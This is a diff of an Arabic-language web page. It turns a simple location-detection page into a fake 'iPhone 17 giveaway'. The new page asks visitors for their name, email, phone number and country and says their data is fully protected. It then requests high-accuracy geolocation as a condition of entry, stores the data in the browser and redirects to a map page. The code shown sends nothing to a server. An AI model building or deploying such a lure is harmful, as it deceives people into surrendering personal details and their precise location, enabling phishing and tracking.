@@ -1,43 +1,383 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>كشف الموقع</title>
+    <title>السحب على iPhone 17 - فرصتك للفوز!</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            direction: rtl;
-            padding: 50px;
-            background-color: #f5f5f5;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
         .container {
-            background: white;
+            max-width: 1000px;
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 30px;
+        }
+        
+        header {
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+        }
+        
+        .content {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+        }
+        
+        .iphone-display {
+            flex: 1;
+            min-width: 300px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .iphone-img {
+            width: 100%;
+            max-width: 350px;
+            filter: drop-shadow(0 10px 20px rgba(0, 0, 0, 0.5));
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+        
+        .registration-form {
+            flex: 1;
+            min-width: 300px;
+            background: rgba(255, 255, 255, 0.1);
             padding: 30px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .form-title {
+            font-size: 1.8rem;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #ffd700;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 12px 15px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.9);
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.5);
+            background: white;
+        }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(to right, #ff8a00, #da1b60);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .features {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+            justify-content: center;
+        }
+        
+        .feature {
+            flex: 1;
+            min-width: 200px;
+            text-align: center;
+            padding: 20px;
+            background: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            max-width: 600px;
-            margin: 0 auto;
+            backdrop-filter: blur(5px);
+        }
+        
+        .feature i {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            color: #ffd700;
+        }
+        
+        .location-permission {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        
+        .location-permission.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .location-btn {
+            background: linear-gradient(to right, #00b09b, #96c93d);
+        }
+        
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 20px;
+            background: rgba(0, 200, 0, 0.2);
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        
+        .success-message.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 0.9rem;
+            opacity: 0.7;
+        }
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+            
+            .content {
+                flex-direction: column;
+            }
+            
+            .iphone-img {
+                max-width: 250px;
+            }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>مرحباً! جاري تحديد موقعك...</h1>
-        <div id="locationInfo"></div>
-        <a href="map.html" id="mapLink" style="display:none;">
-            انتقل إلى صفحة الخريطة
-        </a>
+        <header>
+            <h1>🎉 سحب على iPhone 17 الجديد 🎉</h1>
+            <p class="subtitle">سجل معلوماتك الآن لتحظى بفرصة الفوز بأحدث هاتف من Apple!</p>
+        </header>
+        
+        <div class="content">
+            <div class="iphone-display">
+                <img src="https://images.unsplash.com/photo-1592750475338-74b7b21085ab?ixlib=rb-4.0.3&auto=format&fit=crop&w=500&q=80" alt="iPhone 17" class="iphone-img">
+            </div>
+            
+            <div class="registration-form">
+                <h2 class="form-title">سجل للدخول في السحب</h2>
+                
+                <form id="registrationForm">
+                    <div class="form-group">
+                        <label for="fullName"><i class="fas fa-user"></i> الاسم الكامل</label>
+                        <input type="text" id="fullName" name="fullName" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="email"><i class="fas fa-envelope"></i> البريد الإلكتروني</label>
+                        <input type="email" id="email" name="email" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="phone"><i class="fas fa-phone"></i> رقم الهاتف</label>
+                        <input type="tel" id="phone" name="phone" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="country"><i class="fas fa-globe"></i> الدولة</label>
+                        <select id="country" name="country" required>
+                            <option value="">اختر دولتك</option>
+                            <option value="SA">السعودية</option>
+                            <option value="AE">الإمارات</option>
+                            <option value="KW">الكويت</option>
+                            <option value="QA">قطر</option>
+                            <option value="BH">البحرين</option>
+                            <option value="OM">عمان</option>
+                            <option value="EG">مصر</option>
+                            <option value="JO">الأردن</option>
+                            <option value="LB">لبنان</option>
+                            <option value="other">دولة أخرى</option>
+                        </select>
+                    </div>
+                    
+                    <button type="submit" class="btn">سجل للدخول في السحب</button>
+                </form>
+                
+                <div class="location-permission" id="locationPermission">
+                    <h3><i class="fas fa-map-marker-alt"></i> تحديد الموقع</h3>
+                    <p>لإكمال عملية التسجيل، نحتاج إلى تحديد موقعك لتأكيد مشاركتك في السحب.</p>
+                    <button class="btn location-btn" id="locationBtn">السماح بالوصول إلى الموقع</button>
+                </div>
+                
+                <div class="success-message" id="successMessage">
+                    <h3><i class="fas fa-check-circle"></i> تم التسجيل بنجاح!</h3>
+                    <p>تم تسجيلك في السحب على iPhone 17 بنجاح. جاري توجيهك إلى خريطة موقعك...</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="features">
+            <div class="feature">
+                <i class="fas fa-gift"></i>
+                <h3>جائزة قيمة</h3>
+                <p>iPhone 17 بأحدث المواصفات</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-users"></i>
+                <h3>مشاركة سهلة</h3>
+                <p>سجل بياناتك في دقائق</p>
+            </div>
+            <div class="feature">
+                <i class="fas fa-shield-alt"></i>
+                <h3>آمن ومضمون</h3>
+                <p>بياناتك محمية تمامًا</p>
+            </div>
+        </div>
+        
+        <footer>
+            <p>هذا السحب ينتهي في 30 ديسمبر 2024 | جميع الحقوق محفوظة © 2024</p>
+        </footer>
     </div>
 
     <script>
-        // دالة للحصول على الموقع
-        function getLocation() {
+        document.getElementById('registrationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // جمع بيانات النموذج
+            const formData = {
+                fullName: document.getElementById('fullName').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
+                country: document.getElementById('country').value,
+                timestamp: new Date().toISOString()
+            };
+            
+            // حفظ البيانات في localStorage
+            localStorage.setItem('giveawayRegistration', JSON.stringify(formData));
+            
+            // إظهار طلب الإذن بالموقع
+            document.getElementById('locationPermission').classList.add('active');
+            
+            // تمرير إلى الأعلى لرؤية الرسالة
+            document.getElementById('locationPermission').scrollIntoView({ behavior: 'smooth' });
+        });
+        
+        document.getElementById('locationBtn').addEventListener('click', function() {
             if (navigator.geolocation) {
+                // طلب الموقع بدقة عالية
                 navigator.geolocation.getCurrentPosition(
-                    showPosition,
-                    showError,
+                    function(position) {
+                        // تخزين بيانات الموقع
+                        const locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy,
+                            timestamp: new Date().toISOString()
+                        };
+                        
+                        // حفظ بيانات الموقع
+                        localStorage.setItem('userLocation', JSON.stringify(locationData));
+                        
+                        // إظهار رسالة النجاح
+                        document.getElementById('locationPermission').classList.remove('active');
+                        document.getElementById('successMessage').classList.add('active');
+                        
+                        // الانتقال إلى صفحة الخريطة بعد 3 ثوان
+                        setTimeout(function() {
+                            window.location.href = 'map.html';
+                        }, 3000);
+                    },
+                    function(error) {
+                        let errorMessage;
+                        switch(error.code) {
+                            case error.PERMISSION_DENIED:
+                                errorMessage = "تم رفض طلب الوصول إلى الموقع. يرجى السماح بالوصول للموقع للمشاركة في السحب.";
+                                break;
+                            case error.POSITION_UNAVAILABLE:
+                                errorMessage = "معلومات الموقع غير متوفرة حالياً.";
+                                break;
+                            case error.TIMEOUT:
+                                errorMessage = "انتهت المهلة المحددة للحصول على الموقع.";
+                                break;
+                            default:
+                                errorMessage = "حدث خطأ غير معروف أثناء محاولة تحديد الموقع.";
+                        }
+                        alert(errorMessage);
+                    },
                     {
                         enableHighAccuracy: true,
                         timeout: 10000,
@@ -45,61 +385,9 @@
                     }
                 );
             } else {
-                document.getElementById('locationInfo').innerHTML = 
-                    "المتصفح لا يدعم خدمة تحديد الموقع";
+                alert("المتصفح لا يدعم خدمة تحديد الموقع. يرجى استخدام متصفح آخر.");
             }
-        }
-
-        // عند نجاح الحصول على الموقع
-        function showPosition(position) {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            
-            // حفظ الإحداثيات في localStorage
-            localStorage.setItem('userLat', lat);
-            localStorage.setItem('userLng', lng);
-            
-            document.getElementById('locationInfo').innerHTML = `
-                <p><strong>خط العرض:</strong> ${lat}</p>
-                <p><strong>خط الطول:</strong> ${lng}</p>
-                <p>تم حفظ موقعك بنجاح!</p>
-            `;
-            
-            // إظهار رابط الخريطة
-            document.getElementById('mapLink').style.display = 'block';
-            
-            // إرسال البيانات إلى الخادم (اختياري)
-            sendToServer(lat, lng);
-        }
-
-        // في حالة الخطأ
-        function showError(error) {
-            let message = "";
-            switch(error.code) {
-                case error.PERMISSION_DENIED:
-                    message = "تم رفض طلب الحصول على الموقع";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    message = "معلومات الموقع غير متوفرة";
-                    break;
-                case error.TIMEOUT:
-                    message = "انتهت المهلة المحددة للحصول على الموقع";
-                    break;
-                default:
-                    message = "حدث خطأ غير معروف";
-            }
-            document.getElementById('locationInfo').innerHTML = 
-                `<p style="color: red;">خطأ: ${message}</p>`;
-        }
-
-        // إرسال البيانات إلى الخادم (لأغراض التسجيل)
-        function sendToServer(lat, lng) {
-            // هنا يمكنك إضافة كود لإرسال البيانات إلى خادمك
-            console.log('الإحداثيات:', lat, lng);
-        }
-
-        // تشغيل الدالة عند تحميل الصفحة
-        window.onload = getLocation;
+        });
     </script>
 </body>
 </html>
